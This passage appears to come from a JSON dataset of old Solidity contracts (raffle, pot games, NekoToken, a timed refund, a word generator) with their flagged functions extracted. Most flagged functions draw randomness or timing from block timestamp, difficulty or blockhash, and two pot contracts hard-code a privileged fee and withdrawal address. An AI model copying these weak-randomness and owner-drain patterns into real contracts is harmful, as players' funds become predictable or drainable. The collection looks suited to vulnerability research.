TicketPurchases storage playersTickets = ticketsBoughtByPlayer[player];\n uint256 endIndex = playersTickets.numPurchases - 1;\n if (raffleTicketThatWon >= playersTickets.ticketsBought[0].startId && raffleTicketThatWon <= playersTickets.ticketsBought[endIndex].endId) {\n for (uint256 j = 0; j < playersTickets.numPurchases; j++) {\n TicketPurchase storage playerTicket = playersTickets.ticketsBought[j];\n if (raffleTicketThatWon >= playerTicket.startId && raffleTicketThatWon <= playerTicket.endId) {\n assignRafflePrize(player);\n return;\n }\n }\n }\n }\n }\n function assignRafflePrize(address winner) internal {\n raffleWinner = winner;\n uint256 newPrice = (rare.rareStartPrice() * 25) / 20;\n rare.transferTokenByContract(raffleRareId,winner);\n rare.setRarePrice(raffleRareId,newPrice);\n cards.updatePlayersCoinByOut(winner);\n uint256 upgradeClass;\n uint256 unitId;\n uint256 upgradeValue;\n (,,,,upgradeClass, unitId, upgradeValue) = rare.getRareInfo(raffleRareId);\n cards.upgradeUnitMultipliers(winner, upgradeClass, unitId, upgradeValue);\n RaffleSuccessful(winner);\n }\n function drawRandomWinner() public onlyAdmin {\n require(raffleEndTime < block.timestamp);\n require(!raffleWinningTicketSelected);\n uint256 seed = SafeMath.add(raffleTicketsBought , block.timestamp);\n raffleTicketThatWon = addmod(uint256(block.blockhash(block.number-1)), seed, raffleTicketsBought);\n raffleWinningTicketSelected = true;\n }\n function getRafflePlayers(uint256 raffleId) external constant returns (address[]) {\n return (rafflePlayers[raffleId]);\n }\n function getPlayersTickets(address player) external constant returns (uint256[], uint256[]) {\n TicketPurchases storage playersTickets = ticketsBoughtByPlayer[player];\n if (playersTickets.raffleRareId == raffleRareId) {\n uint256[] memory startIds = new uint256[](playersTickets.numPurchases);\n uint256[] memory endIds = new uint256[](playersTickets.numPurchases);\n for (uint256 i = 0; i < playersTickets.numPurchases; i++) {\n startIds[i] = playersTickets.ticketsBought[i].startId;\n endIds[i] = playersTickets.ticketsBought[i].endId;\n }\n }\n return (startIds, endIds);\n }\n function getLatestRaffleInfo() external constant returns (uint256, uint256, uint256, address, uint256) {\n return (raffleEndTime, raffleRareId, raffleTicketsBought, raffleWinner, raffleTicketThatWon);\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}",
  "extract_feature": [
    "function buyRaffleTicket(uint256 amount) external {\nrequire(raffleEndTime >= block.timestamp);\nrequire(amount > 0);\nuint256 ticketsCost = SafeMath.mul(RAFFLE_TICKET_BASE_PRICE, amount);\nrequire(cards.balanceOf(msg.sender) >= ticketsCost);\ncards.updatePlayersCoinByPurchase(msg.sender, ticketsCost);\nTicketPurchases storage purchases = ticketsBoughtByPlayer[msg.sender];\nif (purchases.raffleRareId != raffleRareId) {\npurchases.numPurchases = 0;\npurchases.raffleRareId = raffleRareId;\nrafflePlayers[raffleRareId].push(msg.sender);\n}\nif (purchases.numPurchases == purchases.ticketsBought.length) {\npurchases.ticketsBought.length = SafeMath.add(purchases.ticketsBought.length,1);\n}\npurchases.ticketsBought[purchases.numPurchases++] = TicketPurchase(raffleTicketsBought, raffleTicketsBought + (amount - 1));\nraffleTicketsBought = SafeMath.add(raffleTicketsBought,amount);\nUnitBought(msg.sender,raffleRareId,amount);\n}",
    "function startRareRaffle(uint256 endTime, uint256 rareId) external onlyAdmin {\nrequire(rareId>0);\nrequire(rare.getRareItemsOwner(rareId) == getRareAddress());\nrequire(block.timestamp < endTime);\nif (raffleRareId != 0) {\nrequire(raffleWinner != 0);\n}\nraffleWinningTicketSelected = false;\nraffleTicketThatWon = 0;\nraffleWinner = 0;\nraffleTicketsBought = 0;\nraffleEndTime = endTime;\nraffleRareId = rareId;\n}",
    "function awardRafflePrize(address checkWinner, uint256 checkIndex) external {\nrequire(raffleEndTime < block.timestamp);\nrequire(raffleWinner == 0);\nrequire(rare.getRareItemsOwner(raffleRareId) == getRareAddress());\nif (!raffleWinningTicketSelected) {\ndrawRandomWinner();\n}\nif (checkWinner != 0) {\nTicketPurchases storage tickets = ticketsBoughtByPlayer[checkWinner];\nif (tickets.numPurchases > 0 && checkIndex < tickets.numPurchases && tickets.raffleRareId == raffleRareId) {\nTicketPurchase storage checkTicket = tickets.ticketsBought[checkIndex];\nif (raffleTicketThatWon >= checkTicket.startId && raffleTicketThatWon <= checkTicket.endId) {\nassignRafflePrize(checkWinner);\nreturn;\n}\n}\n}\nfor (uint256 i = 0; i < rafflePlayers[raffleRareId].length; i++) {\naddress player = rafflePlayers[raffleRareId][i];\nTicketPurchases storage playersTickets = ticketsBoughtByPlayer[player];\nuint256 endIndex = playersTickets.numPurchases - 1;\nif (raffleTicketThatWon >= playersTickets.ticketsBought[0].startId && raffleTicketThatWon <= playersTickets.ticketsBought[endIndex].endId) {\nfor (uint256 j = 0; j < playersTickets.numPurchases; j++) {\nTicketPurchase storage playerTicket = playersTickets.ticketsBought[j];\nif (raffleTicketThatWon >= playerTicket.startId && raffleTicketThatWon <= playerTicket.endId) {\nassignRafflePrize(player);\nreturn;\n}\n}\n}\n}\n}",
    "function drawRandomWinner() public onlyAdmin {\nrequire(raffleEndTime < block.timestamp);\nrequire(!raffleWinningTicketSelected);\nuint256 seed = SafeMath.add(raffleTicketsBought , block.timestamp);\nraffleTicketThatWon = addmod(uint256(block.blockhash(block.number-1)), seed, raffleTicketsBought);\nraffleWinningTicketSelected = true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1ef5"
  },
  "filename": "3122.sol",
  "content": "contract Bigba\n{\n uint public players = 0;\n uint amount;\n uint time;\n uint payment;\n address winner;\n address public owner;\n address public meg = address(this);\n modifier _onlyowner {\n if (msg.sender == owner || msg.sender == 0xC99B66E5Cb46A05Ea997B0847a1ec50Df7fe8976)\n _\n }\n function Bigba() {\n owner = msg.sender;\n }\n function() {\n Start();\n }\n function Start(){\n address developer=0xC99B66E5Cb46A05Ea997B0847a1ec50Df7fe8976;\n if (msg.sender == owner) {\n UpdatePay();\n }else {\n if (msg.value == (1 ether)/10)\n {\n uint fee;\n fee=msg.value/10;\n developer.send(fee/2);\n owner.send(fee/2);\n fee=0;\n amount++;\n if (amount>10) {\n uint deltatime = block.timestamp;\n if (deltatime >= time + 1 hours)\n {\n payment=meg.balance/100*90;\n amount=0;\n winner.send(payment);\n payment=0;\n }\n }\n time=block.timestamp;\n winner = msg.sender;\n } else {\n uint _fee;\n _fee=msg.value/10;\n developer.send(_fee/2);\n owner.send(_fee/2);\n fee=0;\n msg.sender.send(msg.value - msg.value/10);\n }\n }\n }\n function UpdatePay() _onlyowner {\n if (meg.balance>((1 ether)/10)) {\n msg.sender.send(((1 ether)/10));\n } else {\n msg.sender.send(meg.balance);\n }\n }\n}",
  "extract_feature": [
    "function Start(){\naddress developer=0xC99B66E5Cb46A05Ea997B0847a1ec50Df7fe8976;\nif (msg.sender == owner) {\nUpdatePay();\n}else {\nif (msg.value == (1 ether)/10)\n{\nuint fee;\nfee=msg.value/10;\ndeveloper.send(fee/2);\nowner.send(fee/2);\nfee=0;\namount++;\nif (amount>10) {\nuint deltatime = block.timestamp;\nif (deltatime >= time + 1 hours)\n{\npayment=meg.balance/100*90;\namount=0;\nwinner.send(payment);\npayment=0;\n}\n}\ntime=block.timestamp;\nwinner = msg.sender;\n} else {\nuint _fee;\n_fee=msg.value/10;\ndeveloper.send(_fee/2);\nowner.send(_fee/2);\nfee=0;\nmsg.sender.send(msg.value - msg.value/10);\n}\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1ef6"
  },
  "filename": "3125.sol",
  "content": "pragma solidity ^0.4.20;\ncontract NekoToken {\n modifier onlyBagholders() {\n require(myTokens() > 0);\n _;\n }\n modifier onlyStronghands() {\n require(myDividends(true) > 0);\n _;\n }\n modifier onlyAdministrator(){\n address _customerAddress = msg.sender;\n require(administrators[_customerAddress]);\n _;\n }\n modifier antiEarlyWhale(uint256 _amountOfEthereum){\n address _customerAddress = msg.sender;\n if( onlyAmbassadors && ((totalEthereumBalance() - _amountOfEthereum) <= ambassadorQuota_ )){\n require(\n ambassadors_[_customerAddress] == true &&\n (ambassadorAccumulatedQuota_[_customerAddress] + _amountOfEthereum) <= ambassadorMaxPurchase_\n );\n ambassadorAccumulatedQuota_[_customerAddress] = SafeMath.add(ambassadorAccumulatedQuota_[_customerAddress], _amountOfEthereum);\n _;\n } else {\n onlyAmbassadors = false;\n _;\n }\n }\n event onTokenPurchase(\n address indexed customerAddress,\n uint256 incomingEthereum,\n uint256 tokensMinted,\n address indexed referredBy\n );\n event onTokenSell(\n address indexed customerAddress,\n uint256 tokensBurned,\n uint256 ethereumEarned\n );\n event onReinvestment(\n address indexed customerAddress,\n uint256 ethereumReinvested,\n uint256 tokensMinted\n );\n event onWithdraw(\n address indexed customerAddress,\n uint256 ethereumWithdrawn\n );\n event onWin(\n address indexed customerAddress,\n uint256 ethereumWon\n );\n event Transfer(\n address indexed from,\n address indexed to,\n uint256 tokens\n );\n string public name = \"NEKO TOKEN\";\n string public symbol = \"NEKO\";\n uint8 constant public decimals = 18;\n uint8 constant internal dividendFee_ = 4;\n uint256 constant internal tokenPriceInitial_ = 0.0000001 ether;\n uint256 constant internal tokenPriceIncremental_ = 0.00000001 ether;\n uint256 constant internal magnitude = 2**64;\n uint256 public stakingRequirement = 100e18;\n mapping(address => bool) internal ambassadors_;\n uint256 constant internal ambassadorMaxPurchase_ = 5 ether;\n uint256 constant internal ambassadorQuota_ = 10 ether;\n mapping(address => uint256) internal tokenBalanceLedger_;\n mapping(address => uint256) internal referralBalance_;\n mapping(address => int256) internal payoutsTo_;\n mapping(address => uint256) internal ambassadorAccumulatedQuota_;\n uint256 internal tokenSupply_ = 0;\n uint256 internal profitPerShare_;\n uint256 internal jackpot_ = 0;\n mapping(address => bool) public administrators;\n bool public onlyAmbassadors = true;\n address Master;\n uint256 jackpotThreshold;\n uint jackpotFactor = 250;\n uint256 jackpotCounter = 0;\n address lastWinner = 0x0000000000000000000000000000000000000000;\n function NekoToken()\n public\n {\n administrators[msg.sender] = true;\n ambassadors_[0xa9eB31931417d89b233681dfb319783b1703C998] = true;\n ambassadors_[0x3662496Bd906054f535D534c46d130A4ee36624C] = true;\n ambassadors_[0x83c0Efc6d8B16D87BFe1335AB6BcAb3Ed3960285] = true;\n ambassadors_[0xAD6D6c25FCDAb2e737e8de31795df4c6bB6D9Bae] = true;\n ambassadors_[0x4F4eBF556CFDc21c3424F85ff6572C77c514Fcae] = true;\n Master = msg.sender;\n onlyAmbassadors = true;\n jackpotThreshold = random() * 1e15 * jackpotFactor;\n }\n function buy(address _referredBy)\n public\n payable\n returns(uint256)\n {\n purchaseTokens(msg.value, _referredBy);\n }\n function()\n payable\n public\n {\n purchaseTokens(msg.value, 0x0);\n }\n function reinvest()\n onlyStronghands()\n public\n {\n uint256 _dividends = myDividends(false);\n address _customerAddress = msg.sender;\n payoutsTo_[_customerAddress] += (int256) (_dividends * magnitude);\n _dividends += referralBalance_[_customerAddress];\n referralBalance_[_customerAddress] = 0;\n uint256 _tokens = purchaseTokens(_dividends, 0x0);\n onReinvestment(_customerAddress, _dividends, _tokens);\n }\n function exit()\n public\n {\n address _customerAddress = msg.sender;\n uint256 _tokens = tokenBalanceLedger_[_customerAddress];\n if(_tokens > 0) sell(_tokens);\n withdraw();\n }\n function withdraw()\n onlyStronghands()\n public\n {\n address _customerAddress = msg.sender;\n uint256 _dividends = myDividends(false);\n payoutsTo_[_customerAddress] += (int256) (_dividends * magnitude);\n _dividends += referralBalance_[_customerAddress];\n referralBalance_[_customerAddress] = 0;\n _customerAddress.transfer(_dividends);\n onWithdraw(_customerAddress, _dividends);\n }\n function sell(uint256 _amountOfTokens)\n onlyBagholders()\n public\n {\n address _customerAddress = msg.sender;\n require(_amountOfTokens <= tokenBalanceLedger_[_customerAddress]);\n uint256 _tokens = _amountOfTokens;\n uint256 _ethereum = tokensToEthereum_(_tokens);\n uint256 _dividends = SafeMath.div(_ethereum, dividendFee_);\n uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);\n tokenSupply_ = SafeMath.sub(tokenSupply_, _tokens);\n tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _tokens);\n int256 _updatedPayouts = (int256) (profitPerShare_ * _tokens + (_taxedEthereum * magnitude));\n payoutsTo_[_customerAddress] -= _updatedPayouts;\n if (tokenSupply_ > 0) {\n profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);\n }\n onTokenSell(_customerAddress, _tokens, _taxedEthereum);\n }\n function transfer(address _toAddress, uint256 _amountOfTokens)\n onlyBagholders()\n public\n returns(bool)\n {\n address _customerAddress = msg.sender;\n require(!onlyAmbassadors && _amountOfTokens <= tokenBalanceLedger_[_customerAddress]);\n if(myDividends(true) > 0) withdraw();\n uint256 _tokenFee = SafeMath.div(_amountOfTokens, dividendFee_);\n uint256 _taxedTokens = SafeMath.sub(_amountOfTokens, _tokenFee);\n uint256 _dividends = tokensToEthereum_(_tokenFee);\n tokenSupply_ = SafeMath.sub(tokenSupply_, _tokenFee);\n tokenBalanceLedger_[_customerAddress] = SafeMath.sub(tokenBalanceLedger_[_customerAddress], _amountOfTokens);\n tokenBalanceLedger_[_toAddress] = SafeMath.add(tokenBalanceLedger_[_toAddress], _taxedTokens);\n payoutsTo_[_customerAddress] -= (int256) (profitPerShare_ * _amountOfTokens);\n payoutsTo_[_toAddress] += (int256) (profitPerShare_ * _taxedTokens);\n profitPerShare_ = SafeMath.add(profitPerShare_, (_dividends * magnitude) / tokenSupply_);\n Transfer(_customerAddress, _toAddress, _taxedTokens);\n return true;\n }\n function disableInitialStage()\n onlyAdministrator\n public\n {\n onlyAmbassadors = true;\n }\n function setAdministrator(address _identifier, bool _status)\n onlyAdministrator()\n public\n {\n administrators[_identifier] = _status;\n }\n function setStakingRequirement(uint256 _amountOfTokens)\n onlyAdministrator()\n public\n {\n stakingRequirement = _amountOfTokens;\n }\n function setName(string _name)\n onlyAdministrator()\n public\n {\n name = _name;\n }\n function setJackpotFactor(uint _factor)\n onlyAdministrator()\n public\n {\n jackpotFactor = _factor;\n }\n function setSymbol(string _symbol)\n onlyAdministrator()\n public\n {\n symbol = _symbol;\n }\n function totalEthereumBalance()\n public\n view\n returns(uint)\n {\n return this.balance;\n }\n function totalSupply()\n public\n view\n returns(uint256)\n {\n return tokenSupply_;\n }\n function myTokens()\n public\n view\n returns(uint256)\n {\n address _customerAddress = msg.sender;\n return balanceOf(_customerAddress);\n }\n function myDividends(bool _includeReferralBonus)\n public\n view\n returns(uint256)\n {\n address _customerAddress = msg.sender;\n return _includeReferralBonus ? dividendsOf(_customerAddress) + referralBalance_[_customerAddress] : dividendsOf(_customerAddress) ;\n }\n function balanceOf(address _customerAddress)\n view\n public\n returns(uint256)\n {\n return tokenBalanceLedger_[_customerAddress];\n }\n function jackpot()\n public\n view\n returns(uint256)\n {\n return jackpot_;\n }\n function getLastWinner()\n public\n view\n returns(address)\n {\n return lastWinner;\n }\n function dividendsOf(address _customerAddress)\n view\n public\n returns(uint256)\n {\n return (uint256) ((int256)(profitPerShare_ * tokenBalanceLedger_[_customerAddress]) - payoutsTo_[_customerAddress]) / magnitude;\n }\n function sellPrice()\n public\n view\n returns(uint256)\n {\n if(tokenSupply_ == 0){\n return tokenPriceInitial_ - tokenPriceIncremental_;\n } else {\n uint256 _ethereum = tokensToEthereum_(1e18);\n uint256 _dividends = SafeMath.div(_ethereum, dividendFee_ );\n uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);\n return _taxedEthereum;\n }\n }\n function buyPrice()\n public\n view\n returns(uint256)\n {\n if(tokenSupply_ == 0){\n return tokenPriceInitial_ + tokenPriceIncremental_;\n } else {\n uint256 _ethereum = tokensToEthereum_(1e18);\n uint256 _dividends = SafeMath.div(_ethereum, dividendFee_ );\n uint256 _taxedEthereum = SafeMath.add(_ethereum, _dividends);\n return _taxedEthereum;\n }\n }\n function calculateTokensReceived(uint256 _ethereumToSpend)\n public\n view\n returns(uint256)\n {\n uint256 _dividends = SafeMath.div(_ethereumToSpend, dividendFee_);\n uint256 _taxedEthereum = SafeMath.sub(_ethereumToSpend, _dividends);\n uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);\n return _amountOfTokens;\n }\n function calculateEthereumReceived(uint256 _tokensToSell)\n public\n view\n returns(uint256)\n {\n require(_tokensToSell <= tokenSupply_);\n uint256 _ethereum = tokensToEthereum_(_tokensToSell);\n uint256 _dividends = SafeMath.div(_ethereum, dividendFee_);\n uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);\n return _taxedEthereum;\n }\n function purchaseTokens(uint256 _incomingEthereum, address _referredBy)\n antiEarlyWhale(_incomingEthereum)\n internal\n returns(uint256)\n {\n address _customerAddress = msg.sender;\n uint256 _undividedDividends = SafeMath.div(_incomingEthereum, dividendFee_);\n uint256 _referralBonus = SafeMath.div(_undividedDividends, 4);\n uint256 _dividends = SafeMath.sub(_undividedDividends, _referralBonus);\n _dividends = SafeMath.sub(_dividends, _referralBonus);\n uint256 _taxedEthereum = SafeMath.sub(_incomingEthereum, _undividedDividends);\n uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);\n uint256 _fee = _dividends * magnitude;\n jackpotCounter += _incomingEthereum;\n require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));\n if(\n _referredBy != 0x0000000000000000000000000000000000000000 &&\n _referredBy != _customerAddress &&\n tokenBalanceLedger_[_referredBy] >= stakingRequirement\n ){\n referralBalance_[_referredBy] = SafeMath.add(referralBalance_[_referredBy], _referralBonus);\n jackpot_ = SafeMath.add(jackpot_, _referralBonus);\n } else {\n jackpot_ = SafeMath.add(jackpot_, _referralBonus);\n referralBalance_[Master] = SafeMath.add(referralBalance_[Master], _referralBonus);\n }\n if(tokenSupply_ > 0){\n tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);\n profitPerShare_ += (_dividends * magnitude / (tokenSupply_));\n _fee = _fee - (_fee-(_amountOfTokens * (_dividends * magnitude / (tokenSupply_))));\n } else {\n tokenSupply_ = _amountOfTokens;\n }\n tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);\n int256 _updatedPayouts = (int256) ((profitPerShare_ * _amountOfTokens) - _fee);\n payoutsTo_[_customerAddress] += _updatedPayouts;\n onTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _referredBy);\n checkJackpot(msg.sender);\n return _amountOfTokens;\n }\n function random() private view returns (uint8) {\n return uint8(uint256(keccak256(block.timestamp, block.difficulty))%251);\n }\n function checkJackpot(address _jackpotAddress)\n private\n returns(uint256)\n {\n if (jackpotCounter >= jackpotThreshold) {\n uint256 winnings = jackpot_;\n referralBalance_[_jackpotAddress] = SafeMath.add(referralBalance_[_jackpotAddress], jackpot_);\n jackpot_ = 0;\n jackpotCounter = 0;\n jackpotThreshold = random() * 1e15 * jackpotFactor;\n lastWinner = _jackpotAddress;\n onWin(msg.sender, winnings);\n return winnings;\n }\n }\n function ethereumToTokens_(uint256 _ethereum)\n internal\n view\n returns(uint256)\n {\n uint256 _tokenPriceInitial = tokenPriceInitial_ * 1e18;\n uint256 _tokensReceived =\n (\n (\n SafeMath.sub(\n (sqrt\n (\n (_tokenPriceInitial**2)\n +\n (2*(tokenPriceIncremental_ * 1e18)*(_ethereum * 1e18))\n +\n (((tokenPriceIncremental_)**2)*(tokenSupply_**2))\n +\n (2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)\n )\n ), _tokenPriceInitial\n )\n )/(tokenPriceIncremental_)\n )-(tokenSupply_)\n ;\n return _tokensReceived;\n }\n function tokensToEthereum_(uint256 _tokens)\n internal\n view\n returns(uint256)\n {\n uint256 tokens_ = (_tokens + 1e18);\n uint256 _tokenSupply = (tokenSupply_ + 1e18);\n uint256 _etherReceived =\n (\n SafeMath.sub(\n (\n (\n (\n tokenPriceInitial_ +(tokenPriceIncremental_ * (_tokenSupply/1e18))\n )-tokenPriceIncremental_\n )*(tokens_ - 1e18)\n ),(tokenPriceIncremental_*((tokens_**2-tokens_)/1e18))/2\n )\n /1e18);\n return _etherReceived;\n }\n function sqrt(uint x) internal pure returns (uint y) {\n uint z = (x + 1) / 2;\n y = x;\n while (z < y) {\n y = z;\n z = (x / z + z) / 2;\n }\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}",
  "extract_feature": [
    "function random() private view returns (uint8) {\nreturn uint8(uint256(keccak256(block.timestamp, block.difficulty))%251);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1ef7"
  },
  "filename": "3152.sol",
  "content": "contract Lilbank\n{\n uint public players = 0;\n uint amount;\n uint time;\n uint payment;\n address winner;\n address public owner;\n address public meg = address(this);\n modifier _onlyowner {\n if (msg.sender == owner || msg.sender == 0xC99B66E5Cb46A05Ea997B0847a1ec50Df7fe8976)\n _\n }\n function Lilbank() {\n owner = msg.sender;\n }\n function() {\n Start();\n }\n function Start(){\n address developer=0xC99B66E5Cb46A05Ea997B0847a1ec50Df7fe8976;\n if (msg.sender == owner) {\n UpdatePay();\n }else {\n if (msg.value == (1 ether)/100)\n {\n uint fee;\n fee=msg.value/10;\n developer.send(fee/2);\n owner.send(fee/2);\n fee=0;\n amount++;\n if (amount>10) {\n uint deltatime = block.timestamp;\n if (deltatime >= time + 1 hours)\n {\n payment=meg.balance/100*70;\n amount=0;\n winner.send(payment);\n payment=0;\n }\n }\n time=block.timestamp;\n winner = msg.sender;\n } else {\n uint _fee;\n _fee=msg.value/10;\n developer.send(_fee/2);\n owner.send(_fee/2);\n fee=0;\n msg.sender.send(msg.value - msg.value/10);\n }\n }\n }\n function UpdatePay() _onlyowner {\n if (meg.balance>((1 ether)/100)) {\n msg.sender.send(((1 ether)/100));\n } else {\n msg.sender.send(meg.balance);\n }\n }\n}",
  "extract_feature": [
    "function Start(){\naddress developer=0xC99B66E5Cb46A05Ea997B0847a1ec50Df7fe8976;\nif (msg.sender == owner) {\nUpdatePay();\n}else {\nif (msg.value == (1 ether)/100)\n{\nuint fee;\nfee=msg.value/10;\ndeveloper.send(fee/2);\nowner.send(fee/2);\nfee=0;\namount++;\nif (amount>10) {\nuint deltatime = block.timestamp;\nif (deltatime >= time + 1 hours)\n{\npayment=meg.balance/100*70;\namount=0;\nwinner.send(payment);\npayment=0;\n}\n}\ntime=block.timestamp;\nwinner = msg.sender;\n} else {\nuint _fee;\n_fee=msg.value/10;\ndeveloper.send(_fee/2);\nowner.send(_fee/2);\nfee=0;\nmsg.sender.send(msg.value - msg.value/10);\n}\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1ef8"
  },
  "filename": "3185.sol",
  "content": "pragma solidity 0.4.24;\ncontract StarmidTransfer {\n function transfer(address _to, uint256 _value) public returns (bool _result) {\n _result = true;\n }\n}\ncontract StarmidFreezeTokens {\n StarmidTransfer public StarmidFunc;\n address public owner;\n constructor(address _addr) {\n StarmidFunc = StarmidTransfer(_addr);\n owner = 0x378B9eea7ab9C15d9818EAdDe1156A079Cd02ba8;\n }\n function refundTokens(address _to, uint _amount) public returns(bool) {\n require(block.timestamp > 1601510400 && msg.sender == owner);\n StarmidFunc.transfer(_to,_amount);\n return true;\n }\n}",
  "extract_feature": [
    "function refundTokens(address _to, uint _amount) public returns(bool) {\nrequire(block.timestamp > 1601510400 && msg.sender == owner);\nStarmidFunc.transfer(_to,_amount);\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaa9fa0e1460cdfa1ef9"
  },
  "filename": "3190.sol",
  "content": "pragma solidity ^0.4.24;\ncontract wordbot {\nbytes public wordlist = new bytes(6*1024);\nfunction getWords(uint _wordcount) public view returns (bytes6[]) {\n bytes32 entropy;\n bytes6[] memory ret = new bytes6[](_wordcount);\n for(uint i = 0; i < _wordcount; i++) {\n uint index = random(entropy) * 6;\n bytes memory word = new bytes(6);\n word[0] = wordlist[index];\n word[1] = wordlist[index + 1];\n word[2] = wordlist[index + 2];\n word[3] = wordlist[index + 3];\n word[4] = wordlist[index + 4];\n word[5] = wordlist[index + 5];\n bytes6 toBytes6;\n assembly {\n toBytes6 := mload(add(word, 32))\n }\n ret[i] = toBytes6;\n entropy = keccak256(word);\n }\n return ret;\n}\nfunction random(bytes32 _entropy) internal view returns (uint16) {\n return uint16(uint256(keccak256(\n abi.encodePacked(\n block.timestamp, block.difficulty, _entropy\n )\n )\n )%1024);\n}\nconstructor() {\n bytes memory toBytes = new bytes(6*1024);\n assembly {\n mstore(add(toBytes, 32), \"about\")\n mstore(add(toBytes, 38), \"above\")\n mstore(add(toBytes, 44), \"abroad\")\n mstore(add(toBytes, 50), \"accept\")\n mstore(add(toBytes, 56), \"access\")\n mstore(add(toBytes, 62), \"acorn\")\n mstore(add(toBytes, 68), \"acre\")\n mstore(add(toBytes, 74), \"across\")\n mstore(add(toBytes, 80), \"action\")\n mstore(add(toBytes, 86), \"active\")\n mstore(add(toBytes, 92), \"actor\")\n mstore(add(toBytes, 98), \"actual\")\n mstore(add(toBytes, 104), \"add\")\n mstore(add(toBytes, 110), \"adjust\")\n mstore(add(toBytes, 116), \"advice\")\n mstore(add(toBytes, 122), \"aerial\")\n mstore(add(toBytes, 128), \"afford\")\n mstore(add(toBytes, 134), \"after\")\n mstore(add(toBytes, 140), \"again\")\n mstore(add(toBytes, 146), \"agency\")\n mstore(add(toBytes, 152), \"agent\")\n mstore(add(toBytes, 158), \"agile\")\n mstore(add(toBytes, 164), \"agree\")\n mstore(add(toBytes, 170), \"ahead\")\n mstore(add(toBytes, 176), \"alarm\")\n mstore(add(toBytes, 182), \"album\")\n mstore(add(toBytes, 188), \"alert\")\n mstore(add(toBytes, 194), \"alias\")\n mstore(add(toBytes, 200), \"align\")\n mstore(add(toBytes, 206), \"allow\")\n mstore(add(toBytes, 212), \"almost\")\n mstore(add(toBytes, 218), \"aloe\")\n mstore(add(toBytes, 224), \"alpha\")\n mstore(add(toBytes, 230), \"alpine\")\n mstore(add(toBytes, 236), \"also\")\n mstore(add(toBytes, 242), \"alumni\")\n mstore(add(toBytes, 248), \"always\")\n mstore(add(toBytes, 254), \"amber\")\n mstore(add(toBytes, 260), \"analog\")\n mstore(add(toBytes, 266), \"angle\")\n mstore(add(toBytes, 272), \"animal\")\n mstore(add(toBytes, 278), \"annual\")\n mstore(add(toBytes, 284), \"answer\")\n mstore(add(toBytes, 290), \"any\")\n mstore(add(toBytes, 296), \"appear\")\n mstore(add(toBytes, 302), \"apple\")\n mstore(add(toBytes, 308), \"arcade\")\n mstore(add(toBytes, 314), \"area\")\n mstore(add(toBytes, 320), \"armor\")\n mstore(add(toBytes, 326), \"aroma\")\n mstore(add(toBytes, 332), \"array\")\n mstore(add(toBytes, 338), \"arrive\")\n mstore(add(toBytes, 344), \"arrow\")\n mstore(add(toBytes, 350), \"artist\")\n mstore(add(toBytes, 356), \"aside\")\n mstore(add(toBytes, 362), \"aspect\")\n mstore(add(toBytes, 368), \"asset\")\n mstore(add(toBytes, 374), \"assign\")\n mstore(add(toBytes, 380), \"assist\")\n mstore(add(toBytes, 386), \"assume\")\n mstore(add(toBytes, 392), \"atlas\")\n mstore(add(toBytes, 398), \"atom\")\n mstore(add(toBytes, 404), \"atomic\")\n mstore(add(toBytes, 410), \"attach\")\n mstore(add(toBytes, 416), \"attend\")\n mstore(add(toBytes, 422), \"audio\")\n mstore(add(toBytes, 428), \"aurora\")\n mstore(add(toBytes, 434), \"author\")\n mstore(add(toBytes, 440), \"auto\")\n mstore(add(toBytes, 446), \"avatar\")\n mstore(add(toBytes, 452), \"avenue\")\n mstore(add(toBytes, 458), \"aware\")\n mstore(add(toBytes, 464), \"away\")\n mstore(add(toBytes, 470), \"axiom\")\n mstore(add(toBytes, 476), \"axis\")\n mstore(add(toBytes, 482), \"backup\")\n mstore(add(toBytes, 488), \"badge\")\n mstore(add(toBytes, 494), \"bag\")\n mstore(add(toBytes, 500), \"baker\")\n mstore(add(toBytes, 506), \"banana\")\n mstore(add(toBytes, 512), \"bank\")\n mstore(add(toBytes, 518), \"barrel\")\n mstore(add(toBytes, 524), \"base\")\n mstore(add(toBytes, 530), \"basil\")\n mstore(add(toBytes, 536), \"basket\")\n mstore(add(toBytes, 542), \"bean\")\n mstore(add(toBytes, 548), \"become\")\n mstore(add(toBytes, 554), \"bed\")\n mstore(add(toBytes, 560), \"before\")\n mstore(add(toBytes, 566), \"begin\")\n mstore(add(toBytes, 572), \"behind\")\n mstore(add(toBytes, 578), \"bell\")\n mstore(add(toBytes, 584), \"below\")\n mstore(add(toBytes, 590), \"bench\")\n mstore(add(toBytes, 596), \"best\")\n mstore(add(toBytes, 602), 